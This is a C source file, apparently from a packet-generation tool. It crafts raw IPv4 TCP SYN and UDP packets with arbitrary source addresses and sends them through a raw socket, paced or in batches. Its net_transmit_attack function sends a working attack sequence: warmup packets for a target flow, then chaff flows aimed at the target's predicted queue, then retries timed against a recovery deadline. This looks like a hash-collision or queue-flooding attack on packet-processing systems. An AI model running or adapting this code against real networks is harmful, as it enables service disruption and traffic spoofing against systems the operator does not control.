// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

#include "trafficgen.h"

#define BATCH_SIZE 64
#define PAYLOAD_LEN 16

struct tx_context {
	int sock;
	struct sockaddr_in dst;
	uint64_t start_ns;
	uint64_t packet_index;
	uint32_t rate_pps;
};

static uint32_t checksum_add(const void *data, size_t len, uint32_t sum) {
	const uint8_t *bytes = data;

	while (len > 1) {
		sum += ((uint32_t)bytes[0] << 8) | bytes[1];
		bytes += 2;
		len -= 2;
	}
	if (len == 1)
		sum += (uint32_t)bytes[0] << 8;
	return sum;
}

static uint16_t checksum_finish(uint32_t sum) {
	while (sum >> 16)
		sum = (sum & 0xffffu) + (sum >> 16);
	return htons((uint16_t)~sum);
}

static size_t build_packet(uint8_t *buf, const struct flow_tuple *tuple) {
	memset(buf, 0, MAX_PACKET_LEN);
	struct iphdr *ip = (struct iphdr *)buf;
	size_t l4_len = (tuple->proto == IPPROTO_TCP) ? sizeof(struct tcphdr) : sizeof(struct udphdr);
	size_t total_len = sizeof(struct iphdr) + l4_len + PAYLOAD_LEN;

	ip->ihl = 5;
	ip->version = 4;
	ip->tot_len = htons((uint16_t)total_len);
	ip->id = htons(0x1234);
	ip->ttl = 64;
	ip->protocol = tuple->proto;
	ip->saddr = tuple->saddr_be;
	ip->daddr = tuple->daddr_be;
	ip->check = checksum_finish(checksum_add(ip, sizeof(*ip), 0));

	if (tuple->proto == IPPROTO_UDP) {
		struct udphdr *udp = (struct udphdr *)(buf + sizeof(*ip));

		udp->source = tuple->sport_be;
		udp->dest = tuple->dport_be;
		udp->len = htons((uint16_t)(sizeof(*udp) + PAYLOAD_LEN));
		udp->check = 0; // Optional for IPv4 UDP
	} else {
		struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(*ip));
		uint32_t sum = 0;
		size_t tcp_len = sizeof(*tcp) + PAYLOAD_LEN;

		tcp->source = tuple->sport_be;
		tcp->dest = tuple->dport_be;
		tcp->seq = htonl(1);
		tcp->doff = 5;
		tcp->syn = 1;
		tcp->window = htons(64240);

		sum = checksum_add(&ip->saddr, sizeof(ip->saddr), sum);
		sum = checksum_add(&ip->daddr, sizeof(ip->daddr), sum);
		sum += IPPROTO_TCP;
		sum += (uint32_t)tcp_len;
		sum = checksum_add(tcp, tcp_len, sum);
		tcp->check = checksum_finish(sum);
	}

	return total_len;
}

static uint64_t monotonic_ns(void) {
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
		return 0;
	return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static int checked_packet_count(size_t tuples, uint32_t packets_per_tuple,
				size_t *total) {
	if (packets_per_tuple != 0 && tuples > SIZE_MAX / packets_per_tuple)
		return -1;
	*total = tuples * packets_per_tuple;
	return 0;
}

static int open_tx_context(const struct tg_options *opts, struct tx_context *tx) {
	int one = 1;

	memset(tx, 0, sizeof(*tx));
	tx->sock = -1;
	tx->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (tx->sock < 0) {
		perror("socket(SOCK_RAW)");
		return -1;
	}
	if (setsockopt(tx->sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		perror("setsockopt(IP_HDRINCL)");
		close(tx->sock);
		return -1;
	}
	if (setsockopt(tx->sock, SOL_SOCKET, SO_BINDTODEVICE,
		       opts->ifname, strlen(opts->ifname) + 1) < 0) {
		perror("setsockopt(SO_BINDTODEVICE)");
		close(tx->sock);
		return -1;
	}

	tx->dst.sin_family = AF_INET;
	tx->dst.sin_addr.s_addr = opts->dst_ip_be;
	tx->rate_pps = opts->rate_pps;
	tx->start_ns = monotonic_ns();
	if (tx->start_ns == 0) {
		perror("clock_gettime");
		close(tx->sock);
		return -1;
	}
	return 0;
}

static void close_tx_context(struct tx_context *tx) {
	if (tx->sock >= 0)
		close(tx->sock);
}

static void wait_for_packet_slot(const struct tx_context *tx) {
	uint64_t interval_ns;
	uint64_t target_ns;

	if (tx->rate_pps == 0)
		return;
	interval_ns = 1000000000ULL / tx->rate_pps;
	target_ns = tx->start_ns + tx->packet_index * interval_ns;
	while (monotonic_ns() < target_ns) {
		// Busy-wait for sub-millisecond precision
	}
}

static ssize_t send_paced(struct tx_context *tx, const struct flow_tuple *tuples,
			   size_t num_tuples, uint32_t packets_per_tuple) {
	uint8_t packet[MAX_PACKET_LEN];
	ssize_t sent = 0;

	for (size_t i = 0; i < num_tuples; i++) {
		for (uint32_t repetition = 0; repetition < packets_per_tuple; repetition++) {
			size_t packet_len = build_packet(packet, &tuples[i]);
			ssize_t result;

			wait_for_packet_slot(tx);
			result = sendto(tx->sock, packet, packet_len, 0,
					(struct sockaddr *)&tx->dst, sizeof(tx->dst));
			if (result != (ssize_t)packet_len) {
				if (result < 0)
					perror("sendto");
				else
					fprintf(stderr, "sendto sent %zd of %zu bytes\n", result,
						packet_len);
				return -1;
			}
			tx->packet_index++;
			sent++;
		}
	}
	return sent;
}

static ssize_t send_batched(struct tx_context *tx, const struct flow_tuple *tuples,
			    size_t num_tuples, uint32_t packets_per_tuple) {
	uint8_t packet_buffers[BATCH_SIZE][MAX_PACKET_LEN];
	struct mmsghdr messages[BATCH_SIZE];
	struct iovec iovecs[BATCH_SIZE];
	size_t total;
	size_t logical_index = 0;
	ssize_t sent_total = 0;

	if (checked_packet_count(num_tuples, packets_per_tuple, &total) != 0) {
		fprintf(stderr, "Packet count overflow\n");
		return -1;
	}

	while (logical_index < total) {
		size_t batch = total - logical_index;
		size_t sent_in_batch = 0;

		if (batch > BATCH_SIZE)
			batch = BATCH_SIZE;
		memset(messages, 0, sizeof(messages));
		for (size_t i = 0; i < batch; i++) {
			size_t tuple_index = (logical_index + i) / packets_per_tuple;

			iovecs[i].iov_base = packet_buffers[i];
			iovecs[i].iov_len = build_packet(packet_buffers[i], &tuples[tuple_index]);
			messages[i].msg_hdr.msg_name = &tx->dst;
			messages[i].msg_hdr.msg_namelen = sizeof(tx->dst);
			messages[i].msg_hdr.msg_iov = &iovecs[i];
			messages[i].msg_hdr.msg_iovlen = 1;
		}

		while (sent_in_batch < batch) {
			size_t first = sent_in_batch;
			int result = sendmmsg(tx->sock, &messages[sent_in_batch],
					     (unsigned int)(batch - sent_in_batch), 0);

			if (result < 0 && errno == EINTR)
				continue;
			if (result <= 0) {
				if (result < 0)
					perror("sendmmsg");
				else
					fprintf(stderr, "sendmmsg returned zero packets\n");
				return -1;
			}
			for (size_t i = first; i < first + (size_t)result; i++) {
				if (messages[i].msg_len != iovecs[i].iov_len) {
					fprintf(stderr, "sendmmsg sent %u of %zu bytes\n",
						messages[i].msg_len, iovecs[i].iov_len);
					return -1;
				}
			}
			sent_in_batch += (size_t)result;
			sent_total += result;
			tx->packet_index += (uint64_t)result;
		}
		logical_index += batch;
	}
	return sent_total;
}

static ssize_t send_sequence(struct tx_context *tx, const struct flow_tuple *tuples,
			     size_t num_tuples, uint32_t packets_per_tuple) {
	if (tx->rate_pps > 0)
		return send_paced(tx, tuples, num_tuples, packets_per_tuple);
	return send_batched(tx, tuples, num_tuples, packets_per_tuple);
}

int net_transmit_workload(const struct tg_options *opts, const struct flow_tuple *tuples,
			  size_t num_tuples) {
	struct tx_context tx;
	size_t intended;
	ssize_t sent;
	uint64_t elapsed_ns;
	double elapsed_ms;
	double achieved_pps;

	if (checked_packet_count(num_tuples, opts->pkts_per_key, &intended) != 0) {
		fprintf(stderr, "Packet count overflow\n");
		return -1;
	}
	if (open_tx_context(opts, &tx) != 0)
		return -1;
	sent = send_sequence(&tx, tuples, num_tuples, opts->pkts_per_key);
	elapsed_ns = monotonic_ns() - tx.start_ns;
	close_tx_context(&tx);
	if (sent < 0 || (size_t)sent != intended) {
		fprintf(stderr, "Transmission incomplete: sent=%zd intended=%zu\n", sent, intended);
		return -1;
	}

	elapsed_ms = (double)elapsed_ns / 1e6;
	achieved_pps = elapsed_ns > 0 ? (double)sent * 1e9 / (double)elapsed_ns : 0.0;
	printf("tx_complete: keys=%zu pkts_per_key=%u sent=%zd/%zu "
	       "duration_ms=%.2f rate_pps=%.0f\n",
	       num_tuples, opts->pkts_per_key, sent, intended, elapsed_ms, achieved_pps);
	return 0;
}

int net_transmit_attack(const struct tg_options *opts, const struct flow_tuple *target,
			const struct flow_tuple *chaff, size_t num_chaff,
			struct attack_result *result) {
	struct tx_context tx;
	ssize_t sent;

	memset(result, 0, sizeof(*result));
	result->target_queue = target->predicted_queue;
	result->warmup_intended = opts->warmup_pkts;
	result->retry_intended = opts->retry_pkts;
	result->deadline_ns = (uint64_t)opts->deadline_ms * 1000000ULL;
	if (checked_packet_count(num_chaff, opts->pkts_per_key,
				 &result->chaff_intended) != 0) {
		fprintf(stderr, "Chaff packet count overflow\n");
		return -1;
	}
	if (open_tx_context(opts, &tx) != 0)
		return -1;
	result->start_ns = tx.start_ns;

	sent = send_sequence(&tx, target, 1, opts->warmup_pkts);
	if (sent < 0)
		goto fail;
	result->warmup_sent = (size_t)sent;
	result->warmup_end_ns = monotonic_ns();

	sent = send_sequence(&tx, chaff, num_chaff, opts->pkts_per_key);
	if (sent < 0)
		goto fail;
	result->chaff_sent = (size_t)sent;
	result->chaff_end_ns = monotonic_ns();

	sent = send_sequence(&tx, target, 1, opts->retry_pkts);
	if (sent < 0)
		goto fail;
	result->retry_sent = (size_t)sent;
	result->retry_end_ns = monotonic_ns();
	close_tx_context(&tx);

	result->within_deadline =
		result->retry_end_ns - result->warmup_end_ns <= result->deadline_ns;
	if (result->warmup_sent != result->warmup_intended ||
	    result->chaff_sent != result->chaff_intended ||
	    result->retry_sent != result->retry_intended) {
		fprintf(stderr, "Attack phase transmission was incomplete\n");
		return -1;
	}
	if (!result->within_deadline) {
		fprintf(stderr, "Attack exceeded the %u ms recovery deadline\n", opts->deadline_ms);
		return -1;
	}
	return 0;

fail:
	result->retry_end_ns = monotonic_ns();
	close_tx_context(&tx);
	return -1;
}
